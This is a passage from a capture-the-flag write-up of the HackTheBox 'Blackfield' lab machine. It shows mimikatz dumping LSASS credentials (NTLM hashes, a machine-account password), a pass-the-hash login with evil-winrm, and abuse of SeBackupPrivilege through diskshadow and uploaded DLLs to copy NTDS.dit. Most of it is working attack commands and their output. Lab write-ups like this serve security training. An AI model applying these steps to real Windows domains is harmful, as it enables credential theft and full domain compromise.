 <span class="s1">'## v ##'</span>       <span class="no">Vincent</span> <span class="no">LE</span> <span class="no">TOUX</span>             <span class="p">(</span> <span class="n">vincent</span><span class="p">.</span><span class="nf">letoux</span><span class="vi">@gmail</span><span class="p">.</span><span class="nf">com</span> <span class="p">)</span>
  <span class="s1">'#####'</span>        <span class="o">&gt;</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">pingcastle</span><span class="p">.</span><span class="nf">com</span> <span class="o">/</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">mysmartlogon</span><span class="p">.</span><span class="nf">com</span>   <span class="o">***</span><span class="sr">/

mimikatz # sekurlsa::minidump lsass.DMP
Switch to MINIDUMP : 'lsass.DMP'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.DMP' file for minidump...

Authentication Id : 0 ; 406458 (00000000:000633ba)
Session           : Interactive from 2
User Name         : svc_backup
Domain            : BLACKFIELD
Logon Server      : DC01
Logon Time        : 2/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mo">03</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4194615774</span><span class="o">-</span><span class="mi">2175524697</span><span class="o">-</span><span class="mi">3563712290</span><span class="o">-</span><span class="mi">1413</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="mi">9658</span><span class="n">d1d1dcd9250115e2205d9f48400d</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="mi">463</span><span class="n">c13a9a31fc3252c68ba0a44f0221626a33e5c</span>
         <span class="o">*</span> <span class="no">DPAPI</span>    <span class="p">:</span> <span class="n">a03cd8e9d30171f3cfe8caad92fef621</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>

<span class="no">Authentication</span> <span class="no">Id</span> <span class="p">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">153705</span> <span class="p">(</span><span class="mo">00000000</span><span class="p">:</span><span class="mo">00025</span><span class="mi">869</span><span class="p">)</span>
<span class="no">Session</span>           <span class="p">:</span> <span class="no">Interactive</span> <span class="n">from</span> <span class="mi">1</span>
<span class="no">User</span> <span class="no">Name</span>         <span class="p">:</span> <span class="no">Administrator</span>
<span class="no">Domain</span>            <span class="p">:</span> <span class="no">BLACKFIELD</span>
<span class="no">Logon</span> <span class="no">Server</span>      <span class="p">:</span> <span class="no">DC01</span>
<span class="no">Logon</span> <span class="no">Time</span>        <span class="p">:</span> <span class="mi">2</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mo">04</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4194615774</span><span class="o">-</span><span class="mi">2175524697</span><span class="o">-</span><span class="mi">3563712290</span><span class="o">-</span><span class="mi">500</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">Administrator</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="mi">7</span><span class="n">f1e4ff8c6a8e6b6fcae2d9c0572cd62</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="n">db5c89a961644f0978b4b69a4d2a2239d7886368</span>
         <span class="o">*</span> <span class="no">DPAPI</span>    <span class="p">:</span> <span class="mi">240339</span><span class="n">f898b6ac4ce3f34702e4a89550</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">Administrator</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">Administrator</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>

<span class="no">Authentication</span> <span class="no">Id</span> <span class="p">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">40310</span> <span class="p">(</span><span class="mo">00000000</span><span class="p">:</span><span class="mo">0000</span><span class="mi">9</span><span class="n">d76</span><span class="p">)</span>
<span class="no">Session</span>           <span class="p">:</span> <span class="no">Interactive</span> <span class="n">from</span> <span class="mi">1</span>
<span class="no">User</span> <span class="no">Name</span>         <span class="p">:</span> <span class="no">DWM</span><span class="o">-</span><span class="mi">1</span>
<span class="no">Domain</span>            <span class="p">:</span> <span class="no">Window</span> <span class="no">Manager</span>
<span class="no">Logon</span> <span class="no">Server</span>      <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
<span class="no">Logon</span> <span class="no">Time</span>        <span class="p">:</span> <span class="mi">2</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">46</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">90</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">1</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">DC01</span><span class="err">$</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="n">b624dc83a27cc29da11d9bf25efea796</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="mi">4</span><span class="n">f2a203784d655bb3eda54ebe0cfdabe93d4a37d</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">DC01</span><span class="err">$</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="no">DC01</span><span class="err">$</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="p">.</span><span class="nf">local</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="o">&amp;</span><span class="no">SYVE</span><span class="o">+&lt;</span><span class="n">ynu</span><span class="sb">`Ql;gvEE!f$DoO0F+,gP@P`</span><span class="n">fra</span><span class="sb">`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`</span><span class="n">b</span><span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span><span class="o">&lt;</span><span class="no">Vb0I6</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>



<span class="no">Authentication</span> <span class="no">Id</span> <span class="p">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">406499</span> <span class="p">(</span><span class="mo">00000000</span><span class="p">:</span><span class="mo">000633</span><span class="n">e3</span><span class="p">)</span>
<span class="no">Session</span>           <span class="p">:</span> <span class="no">Interactive</span> <span class="n">from</span> <span class="mi">2</span>
<span class="no">User</span> <span class="no">Name</span>         <span class="p">:</span> <span class="n">svc_backup</span>
<span class="no">Domain</span>            <span class="p">:</span> <span class="no">BLACKFIELD</span>
<span class="no">Logon</span> <span class="no">Server</span>      <span class="p">:</span> <span class="no">DC01</span>
<span class="no">Logon</span> <span class="no">Time</span>        <span class="p">:</span> <span class="mi">2</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">11</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mo">03</span> <span class="no">PM</span>
<span class="no">SID</span>               <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4194615774</span><span class="o">-</span><span class="mi">2175524697</span><span class="o">-</span><span class="mi">3563712290</span><span class="o">-</span><span class="mi">1413</span>
        <span class="n">msv</span> <span class="p">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="no">Primary</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">NTLM</span>     <span class="p">:</span> <span class="mi">9658</span><span class="n">d1d1dcd9250115e2205d9f48400d</span>
         <span class="o">*</span> <span class="no">SHA1</span>     <span class="p">:</span> <span class="mi">463</span><span class="n">c13a9a31fc3252c68ba0a44f0221626a33e5c</span>
         <span class="o">*</span> <span class="no">DPAPI</span>    <span class="p">:</span> <span class="n">a03cd8e9d30171f3cfe8caad92fef621</span>
        <span class="n">tspkg</span> <span class="p">:</span>
        <span class="n">wdigest</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">kerberos</span> <span class="p">:</span>
         <span class="o">*</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">svc_backup</span>
         <span class="o">*</span> <span class="no">Domain</span>   <span class="p">:</span> <span class="no">BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span>
         <span class="o">*</span> <span class="no">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
        <span class="n">ssp</span> <span class="p">:</span>
        <span class="n">credman</span> <span class="p">:</span>


</code></pre></div></div>

<h3 id="at-this-point-i-was-a-little-exited-as-i-got-the-admin--hash-but-yeah-dont-expect-anything-to-be-simple">At this point I was a little exited as I got the <code class="language-plaintext highlighter-rouge">Admin </code> hash, But yeah <code class="language-plaintext highlighter-rouge">Don't expect anything to be simple</code>.</h3>
<h3 id="so-i-tried-to-crack-the-hash-of-svc-backup-but-no-luck-so-i-tried-to-pass-the-hash-using-evil-winrm">So I tried to crack the hash of <code class="language-plaintext highlighter-rouge">SVC-Backup</code> but no luck, So I tried to pass the hash using <code class="language-plaintext highlighter-rouge">Evil-winrm</code>.</h3>

<p>` evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfield.htb`</p>

<h3 id="it-was-a-success">It was a Success!</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfiled.htb

 Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt;
</code></pre></div></div>
<h2 id="getting-usertxt">Getting User.txt</h2>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_backup</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">Desktop</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_backup</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span>
<span class="mf">3e666</span><span class="o">----------------------------</span><span class="mi">30</span><span class="n">a</span>             
</code></pre></div></div>
<h2 id="privilege-escalation">Privilege Escalation</h2>

<h3 id="seeing-the-privileges-of-svc-backup">Seeing the privileges of <code class="language-plaintext highlighter-rouge">svc-backup</code></h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all

USER INFORMATION                                                                                                                                                                            
<span class="nt">----------------</span>
User Name             SID                                                                                                                                                                                                                  
<span class="o">=====================</span> <span class="o">==============================================</span>
blackfield<span class="se">\s</span>vc_backup S-1-5-21-4194615774-2175524697-3563712290-1413                                                                                                                                                                     
GROUP INFORMATION                                                                                                                                                                                                                          
<span class="nt">-----------------</span>

Group Name                                 Type             SID          Attributes                                                                                                                                                        
<span class="o">==========================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\B</span>ackup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="se">\H</span>igh Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled


USER CLAIMS INFORMATION
<span class="nt">-----------------------</span>

User claims unknown.

Kerberos support <span class="k">for </span>Dynamic Access Control on this device has been disabled.
</code></pre></div></div>

<h3 id="enumerating-you-will-find-notestxt-and-since-svc_backup-has-backup-ability-robocopy-can-be-exploited-in-a-way">Enumerating you will find notes.txt and since svc_backup has backup ability robocopy can be exploited in a way.</h3>

<p><a href="https://pentestlab.blog/tag/diskshadow/">https://pentestlab.blog/tag/diskshadow/</a></p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="c1"># cat jeevan.txt </span>
<span class="no">SET</span> <span class="no">CONTEXT</span> <span class="no">PERSISTENT</span> <span class="no">NOWRITERS</span><span class="c1">#</span>
<span class="n">add</span> <span class="n">volume</span> <span class="ss">c: </span><span class="k">alias</span> <span class="n">jeevan</span><span class="c1">#</span>
<span class="n">createp</span><span class="c1">#</span>
<span class="n">expose</span> <span class="o">%</span><span class="n">jeevan</span><span class="o">%</span> <span class="n">z</span><span class="p">:</span><span class="c1">#</span>
</code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; diskshadow /s jeevan.txt
Microsoft DiskShadow version 1.0
Copyright <span class="o">(</span>C<span class="o">)</span> 2013 Microsoft Corporation
On computer:  DC01,  7/11/2020 2:44:35 PM

-&gt; SET CONTEXT PERSISTENT NOWRITERS
-&gt; add volume c: <span class="nb">alias </span>jeevan
-&gt; create
Alias jeevan <span class="k">for </span>shadow ID <span class="o">{</span>64f5cc48-8cd1-4d3a-9393-504db85af469<span class="o">}</span> <span class="nb">set </span>as environment variable.
Alias VSS_SHADOW_SET <span class="k">for </span>shadow <span class="nb">set </span>ID <span class="o">{</span>95cfeba5-f3b5-43bc-ad73-c6bcee2bc475<span class="o">}</span> <span class="nb">set </span>as environment variable.

Querying all shadow copies with the shadow copy <span class="nb">set </span>ID <span class="o">{</span>95cfeba5-f3b5-43bc-ad73-c6bcee2bc475<span class="o">}</span>

        <span class="k">*</span> Shadow copy ID <span class="o">=</span> <span class="o">{</span>64f5cc48-8cd1-4d3a-9393-504db85af469<span class="o">}</span>               %jeevan%
                - Shadow copy <span class="nb">set</span>: <span class="o">{</span>95cfeba5-f3b5-43bc-ad73-c6bcee2bc475<span class="o">}</span>       %VSS_SHADOW_SET%
                - Original count of shadow copies <span class="o">=</span> 1
                - Original volume name: <span class="se">\\</span>?<span class="se">\V</span>olume<span class="o">{</span>351b4712-0000-0000-0000-602200000000<span class="o">}</span><span class="se">\ </span><span class="o">[</span>C:<span class="se">\]</span>
                - Creation <span class="nb">time</span>: 7/11/2020 2:44:35 PM
                - Shadow copy device name: <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: <span class="o">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="o">}</span>
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-&gt; expose %jeevan% z:
-&gt; %jeevan% <span class="o">=</span> <span class="o">{</span>64f5cc48-8cd1-4d3a-9393-504db85af469<span class="o">}</span>
The shadow copy was successfully exposed as z:<span class="se">\.</span>
-&gt;
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\W</span>indows<span class="se">\t</span>emp


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        7/11/2020   2:44 PM            628 2020-07-11_14-44-35_DC01.cab
<span class="nt">-a----</span>        7/11/2020   2:44 PM             90 jeevan.txt
<span class="nt">-a----</span>        7/11/2020   1:13 PM         135470 MpCmdRun.log
<span class="nt">-a----</span>        7/11/2020  12:42 PM            102 silconfig.log
<span class="nt">------</span>        7/11/2020  12:42 PM          63072 vmware-vmsvc.log
<span class="nt">------</span>        7/11/2020  12:43 PM          15832 vmware-vmusr.log
<span class="nt">-a----</span>        7/11/2020  12:42 PM           1728 vmware-vmvss.log


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; 
</code></pre></div></div>

<p>At this point I realised the privs of <code class="language-plaintext highlighter-rouge">svc-backup</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</code></pre></div></div>
<h2 id="to-get-the-ntdsdit-i-need-to-fool-the-system-in-order-to-do-so">To get the <code class="language-plaintext highlighter-rouge">NTDS.dit</code> I need to fool the system in order to do so.</h2>

<p><a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</a></p>

<h2 id="after-uploading-both-the-dll-files">After Uploading both the <code class="language-plaintext highlighter-rouge">.dll</code> files.</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; upload SeBackupPrivilegeCmdLets.dll
Info: Uploading SeBackupPrivilegeCmdLets.dll to C:<span class="se">\W</span>indows<span class="se">\t</span>emp<span class="se">\S</span>eBackupPrivilegeCmdLets.dll

                                                             
Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; upload SeBackupPrivilegeUtils.dll
Info: Uploading SeBackupPrivilegeUtils.dll to C:<span class="se">\W</span>indows<span class="se">\t</span>emp<span class="se">\S</span>eBackupPrivilegeUtils.dll

                                                             
Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; 
</code></pre></div></div>
<h2 id="time-to-import-the-modules">Time to import the modules.</h2>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">*Evil-WinRM* PS C:\Windows\temp&gt; import-module .\SeBackupPrivilegeUtils.dll</code>
<code class="language-plaintext highlighter-rouge">*Evil-WinRM* PS C:\Windows\temp&gt; import-module .\SeBackupPrivilegeCmdLets.dll</code></p>
</blockquote>

<h3 id="time-to-copy-ntdsdit">Time to copy <code class="language-plaintext highlighter-rouge">NTDS.dit</code></h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="o">&gt;</span> <span class="no">Copy</span><span class="o">-</span><span class="no">FileSebackupPrivilege</span> <span class="n">z</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="no">NTDS</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="nf">dit</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">ndts</span><span class="p">.</span><span class="nf">dit</span>
<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="o">&gt;</span> <span class="n">ls</span>


    <span class="no">Directory</span><span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span>


<span class="no">Mode</span>                <span class="no">LastWriteTime</span>         <span class="no">Length</span> <span class="no">Name</span>
<span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="no">PM</span>            <span class="mi">628</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11_14</span><span class="o">-</span><span class="mi">44</span><span class="o">-</span><span class="mi">35</span><span class="n">_DC01</span><span class="p">.</span><span class="nf">cab</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="no">PM</span>             <span class="mi">90</span> <span class="n">jeevan</span><span class="p">.</span><span class="nf">txt</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">1</span><span class="p">:</span><span class="mi">13</span> <span class="no">PM</span>         <span class="mi">135470</span> <span class="no">MpCmdRun</span><span class="p">.</span><span class="nf">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">56</span> <span class="no">PM</span>       <span class="mi">18874368</span> <span class="n">ndts</span><span class="p">.</span><span class="nf">dit</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="no">PM</span>          <span class="mi">12288</span> <span class="no">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="nf">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="no">PM</span>          <span class="mi">16384</span> <span class="no">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="nf">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="no">PM</span>            <span class="mi">102</span> <span class="n">silconfig</span><span class="p">.</span><span class="nf">log</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="no">PM</span>          <span class="mi">63072</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmsvc</span><span class="p">.</span><span class="nf">log</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="no">PM</span>          <span class="mi">15832</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmusr</span><span class="p">.</span><span class="nf">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="no">PM</span>           <span class="mi">1728</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmvss</span><span class="p">.</span><span class="nf">log</span>


<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="o">&gt;</span> 

</code></pre></div></div>

<h3 id="file-successfully-copied">File successfully copied…</h3>
<p><code class="language-plaintext highlighter-rouge">-a----        7/11/2020   2:56 PM       18874368 ndts.dit</code></p>

